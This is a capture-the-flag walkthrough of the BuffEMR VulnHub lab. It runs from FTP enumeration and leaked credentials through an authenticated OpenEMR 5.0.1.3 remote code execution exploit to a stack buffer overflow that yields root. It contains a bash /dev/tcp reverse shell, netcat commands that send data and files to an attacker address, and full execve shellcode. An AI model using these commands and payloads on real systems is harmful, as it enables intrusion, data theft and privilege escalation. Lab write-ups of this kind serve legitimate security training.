# BuffEMR: 1.0.1

**VIDEO BuffEMR VulnHub: Easy Walkthrough/Writeup (No Commentary) with Lofi Music [HERE](https://youtu.be/2Nz7mFjZWXU)**

Skills:
- FTP Enumeration
- Information Leakage
- OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)
- Buffer Overflow x32 - Stack based [Linux x86 shellcode - execve("/bin/bash", ["/bin/bash", "-p"], NULL) - 33 bytes]

## The Walkthrough/Writeup

We'll use `nmap` to see which ports are open. We'll use the `-p-` parameter to scan the entire range of 65535 ports, and then we'll use `--open` to report the open ports. We'll use `-sS` for a faster and more precise scan to avoid false positives, and set `--min-rate 5000` to ensure that packets are transmitted at no less than 5000 packets per second. We'll also use `-vvv` to get verbose output, and `-n` so that DNS resolution isn't applied. Finally, we'll use the `-Pn` parameter to indicate that we won't perform host detection via ping, and that we'll attempt to scan the ports of all specified hosts regardless of whether they respond to pings or not. We're configuring it this way because we're in a controlled environment and want to quickly exploit it.

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ipvictim
```

Now we'll launch a series of basic reconnaissance scripts with `-sC` to detect the version and services running on these ports. We'll use `-sV` to get more information about the open ports.

```
nmap -sCV -p21,22,80 ipvictim
```

We see that port 21 is open, and nmap uses `ftp-anon`, one of the basic reconnaissance scripts it launches, to detect whether anonymous user access is enabled. In this case, it is. We also see a share resource, which we can try to download and enumerate to see what's inside. We'll navigate to our content directory with `cd ../content` and use FTP to connect to the victim machine.

We see that there's a README file and an openemr directory, so let's download it to our machine with:

```
wget -r ftp://ipvictim
```

OpenEMR is a medical practice management software, so let's use `whatweb` to perform a small reconnaissance of the web server:

```
whatweb http://ipvictim
```

We look at the website and there's nothing unusual, so let's try adding `openemr` to the URL to see what happens. This opens a login panel, so let's go to our `openemr` folder and try to find more information there:

```
find -name *conf*
```

We see `./sites/default/sqlconf.php`, so let's review it.

We have login credentials for the database. Interesting, but let's keep searching for all the resources:

```
find .
```

I'm interested in `./tests/test.accounts`.

We are given a username and password, in this case `admin:Monster123`. Let's try to log in to the login panel we saw earlier with these credentials.

We were able to log in with those credentials, now let's check the version of OpenEMR and look for possible vulnerabilities.

```
searchsploit openemr 5.0.1
```

We see a

 remote code execution (authenticated). Since we already have credentials, we can try this exploit to see if it works. Let's go to our exploits directory to download the exploit.

```
searchsploit -m php/webapps/45161.py
```

Let's see what it does.

Now let's use the exploit:

We put ourselves in listening mode:

```
nc -nlvp 443
```

And now we execute the exploit to see if it works:

```
python 45161.py -u admin -p Monster123 -c "whoami | nc yourattackerip 443" http://victimipvictim/openemr
```

As we can see, we receive something on our end, so we can try to send ourselves a bash.

```
python 45161.py -u admin -p Monster123 -c "bash -i >& /dev/tcp/yourattackerip/443 0>&1" http://victimipvictim/openemr
```

We gained access with the exploit, now let's get a tty treatment on the console to make it fully interactive.

```
script /dev/null -c bash (press enter)
Ctrl + Z (press enter)
stty raw -echo; fg (press enter)
reset xterm (press enter)
export TERM=xterm (press enter)
export SHELL=/bin/bash (press enter)
stty rows yournumber columns yournumber (press enter)
```

We go to the home directory `cd /home`, we see a user called `buffemr`, and if we try to enter `cd buffemr` it says permission denied. If we use `ls -l`, we see that the user is a system-level user, and the mission now is to become that user.

Let's search for SUID permissions to see if we can elevate our privileges through some binary whose owner is root. We do `cd /` and then:

```
find -perm -4000 -user root 2>/dev/null
```

We see `pkexec`, but in this case, we're not going to exploit it. We'll look for another way.

Let's go back to the `openemr` folder and try to enumerate to see what else we can find, let's check the `sql` folder, we see a `keys.sql` file, let's see what it shows us.

After thoroughly reviewing, we see something that might interest us.

Let's copy the base64-encoded string and try to decode it:

```bash
echo "c2FuM25jcnlwdDNkCg==" | base64 -d; echo
```

We see that it's a possible password, and we already have a user, `buffemr`, but when we try it, we see that it's not the user's password. So let's enumerate in search of more users.

Let's `cd /var` to enumerate things from the web service, and we see a `user.zip`. Let's try to download it to our content directory.

Let's set up a listener on port 443, and anything we receive in terms of connections will be saved to the `user.zip` file. On our machine:

```bash
nc -nlvp 444 > user.zip
```

On the server console:

```bash
nc attackerip 444 < user.zip
```

Let's check the contents of `user.zip` on our machine.

We are prompted for a password, so we can try the password we found earlier `c2FuM25jcnlwdDNkCg==`, and indeed we were able to decompress the file. We checked the content and found the user password for `buffemr`.

Let's try to log in to the system console with `buffemr` using the password, and we were able to log in. Here we can find the flag for the first part; now we need to be ROOT.

Now, as this user, we will scan again since this user may have access to other files `cd /`.

```bash
find -perm -4000 -user root 2>/dev/null
```

We found something suspicious in `./opt/dontexecute`.

Let's do a basic buffer overflow test and see what happens.

```bash
./opt/dontexecute A...; echo (write many times the letter "A" to trigger segmentation fault (core dumped))
```

We can try to do a buffer overflow:

```bash
cd /opt/
ls
which gdb
gdb ./dontexecute -q
r $(python -c 'print "\x90"*479 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x70\xd6\xff\xff"')
```

We were able to execute a bash, now let's do it outside of gdb:

```bash
./dontexecute $(python -c 'print "\x90"*479 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x70\xd6\xff\xff"')
```
```
